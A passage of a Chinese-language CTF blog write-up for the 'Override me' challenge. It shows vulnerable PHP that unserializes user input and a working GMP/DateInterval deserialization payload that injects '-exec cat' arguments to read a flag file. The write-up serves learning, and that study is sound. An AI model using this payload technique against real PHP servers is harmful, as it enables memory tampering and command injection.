class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $func = <span class="keyword">$this</span>-&gt;content;</span><br><span class="line">        <span class="keyword">return</span> $func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$show = <span class="keyword">new</span> ShowOff();</span><br><span class="line">$bullet = $_GET[<span class="string">'bullet'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($bullet))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Give Me Something!"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($bullet == <span class="string">'phpinfo'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $infos = <span class="keyword">new</span> Info();</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $obstacle1 = <span class="keyword">new</span> stdClass;</span><br><span class="line">    $mc = <span class="keyword">new</span> MyClass();</span><br><span class="line">    $mc-&gt;flag = <span class="string">"MyClass's flag said, Overwrite Me If You Can!"</span>;</span><br><span class="line">    @unserialize($bullet);</span><br><span class="line">    <span class="keyword">echo</span> $mc-&gt;get_flag();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看到这个源码，就会想到GMP反序列化，因为它有一个转整型的操作，就可以利用GMP反序列化来修改内存中的对象的值。具体的原理参考<a href="https://paper.seebug.org/1267/。" target="_blank" rel="noopener">https://paper.seebug.org/1267/。</a></p>
+<p>首先$bullet的值设置为phpinfo()，发现PHP的版本为5.6.10版本。php版本小于5.6.11，可以使用内置类<code>DateInterval</code>。<br><img src="22.png" alt=""><br>然后$bullet设置为空，可以发现suffix_flag的位置。<br><img src="23.png" alt=""></p>
+<p>然后利用payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;i:0;C:3:&quot;GMP&quot;:109:&#123;s:1:&quot;3&quot;;a:2:&#123;s:4:&quot;flag&quot;;s:36:&quot;-name suffix_flag.php -exec cat &#123;&#125; ;&quot;;i:0;O:12:&quot;DateInterval&quot;:1:&#123;s:1:&quot;y&quot;;R:2;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>获得flag。<br><img src="24.png" alt=""></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/08/11/phpmailer-vul/" rel="prev" title="PHPMailer漏洞总结">
+      <i class="fa fa-chevron-left"></i> PHPMailer漏洞总结
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web签到题"><span class="nav-number">1.</span> <span class="nav-text">web签到题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#卡片商店"><span class="nav-number">2.</span> <span class="nav-text">卡片商店</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EASY-WEB"><span class="nav-number">3.</span> <span class="nav-text">EASY_WEB</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Override-me"><span class="nav-number">4.</span> <span class="nav-text">Override me</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ananaskr</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">41</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ananaskr</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
